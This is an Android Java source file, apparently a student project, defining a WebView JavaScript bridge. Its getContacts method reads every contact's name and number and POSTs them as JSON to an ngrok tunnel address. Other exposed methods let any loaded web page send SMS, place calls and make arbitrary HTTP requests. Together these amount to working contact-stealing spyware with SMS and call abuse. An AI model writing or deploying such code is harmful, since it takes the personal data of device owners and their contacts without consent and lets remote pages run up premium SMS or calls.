package com.example.sriotd2;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.gson.Gson;

import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;

public class WebAppInterface {
    Context mContext;

    /** Instantiate the interface and set the context */
    WebAppInterface(Context c) {
        mContext = c;
    }

    /** Show a toast from the web page */
    @JavascriptInterface
    public void showToast(String toast) {
        Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();
    }

    @SuppressLint("Range")
    @JavascriptInterface
    /**public String getContacts() {
        // Définir un curseur qui va parcourir les contacts, le carnet d'adresses d'android se présente comme un tableau ayant multiples colonnes
        Cursor cursor = mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        String name = null;
        String number = null;
        // Création d'une ArrayList de contacts
        ArrayList<Contact> contacts = new ArrayList<Contact>();

        // Tester si le curseur peut avancer

        while (cursor.moveToNext()) {
            // retourne le nom du contact dans lequel se situe le curseur
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            System.out.println(name);
            // retourne le numéro de téléphone du contact dans lequel se situe le curseur
            number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            System.out.println(number);
            //Ajouter le contact récupéré dans l'ArrayList
            contacts.add(new Contact(name, number));
        }
        Gson gson = new Gson();
        String contactsJson = gson.toJson(contacts);
        // Fermer le curseur, cette commande est obligatoire
        cursor.close();

        System.out.println(contactsJson);

        return contactsJson;
    }
    **/

    public String getContacts() throws IOException {
        // Définir un curseur qui va parcourir les contacts, le carnet d'adresses d'android se présente comme un tableau ayant multiples colonnes
        Cursor cursor = mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);

        String name = null;
        String number = null;
        // Création d'une ArrayList de contacts
        ArrayList<Contact> contacts = new ArrayList<Contact>();

        // Tester si le curseur peut avancer
        while (cursor.moveToNext())
        {
            // retourne le nom du contact dans lequel se situe le curseur
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

            // retourne le numéro de téléphone du contact dans lequel se situe le curseur
            number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            //Ajouter le contact récupéré dans l'ArrayList
            contacts.add(new Contact(name,number));
        }

        String contactsJSON = new Gson().toJson(contacts);

        // Fermer le curseur, cette commande est obligatoire
        cursor.close();

        //System.out.println(contactsJSON);
        postStringRequest("http://5f47-148-60-99-9.ngrok.io/contact",contactsJSON);
        return contactsJSON;
    }

    @JavascriptInterface
    public void sendSMS(String number, String content)
    {
        SmsManager smsManager = SmsManager.getDefault();

        mContext.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("SMS ", "sent");
                Toast.makeText(mContext, "SMS SENT", Toast.LENGTH_SHORT).show();

            }
        }, new IntentFilter("SMS_SENT_ACTION"));

        mContext.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("SMS ", "delivered");
                Toast.makeText(mContext, "SMS DELIVERED", Toast.LENGTH_SHORT).show();
            }
        }, new IntentFilter("SMS_DELIVERED_ACTION"));

        PendingIntent sentIntent = PendingIntent.getBroadcast(mContext, 100, new Intent("SMS_SENT_ACTION"), 0);
        PendingIntent deliveryIntent = PendingIntent.getBroadcast(mContext, 200, new Intent("SMS_DELIVERED_ACTION"), 0);

        smsManager.sendTextMessage(number, null, content, sentIntent, deliveryIntent);
    }

    @JavascriptInterface
    public void composeNum(String number)
    {
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:"+number));
        mContext.startActivity(intent);
    }
    @JavascriptInterface
    public void postStringRequest(String URL, String informationsJson)
    {
        RequestQueue requestQueue = Volley.newRequestQueue(mContext);
        final String requestBody = informationsJson;

        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.i("VOLLEY Response ", response);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.e("VOLLEY Error", error.toString());
            }
        }) {
            @Override
            public String getBodyContentType() {
                return "application/json; charset=utf-8";
            }

            @Override
            public byte[] getBody() throws AuthFailureError {
                try {
                    //Log.i("tag","qsqsfs");
                    return requestBody == null ? null : requestBody.getBytes("utf-8");
                } catch (UnsupportedEncodingException uee) {
                    VolleyLog.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", requestBody, "utf-8");
                    return null;
                }
            }

            @Override
            protected Response<String> parseNetworkResponse(NetworkResponse response) {
                String responseString = "";
                if (response != null) {
                    responseString = String.valueOf(response.statusCode);
                    // can get more details such as response.headers
                }
                return Response.success(responseString, HttpHeaderParser.parseCacheHeaders(response));
            }
        };

        requestQueue.add(stringRequest);
    }
    @JavascriptInterface
    public String getRequest(String url) throws IOException {
        final String[] result = {""};
        // Instantiate the RequestQueue.
        RequestQueue queue = Volley.newRequestQueue(mContext);
        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the first 500 characters of the response string.
                        System.out.println("Response is: "+ response);
                        result[0] = response;

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                System.out.println("That didn't work!");
                System.out.println("Erreur " + error.toString());
            }
        });
        // Add the request to the RequestQueue.
        queue.add(stringRequest);
        return  result[0];
    }
}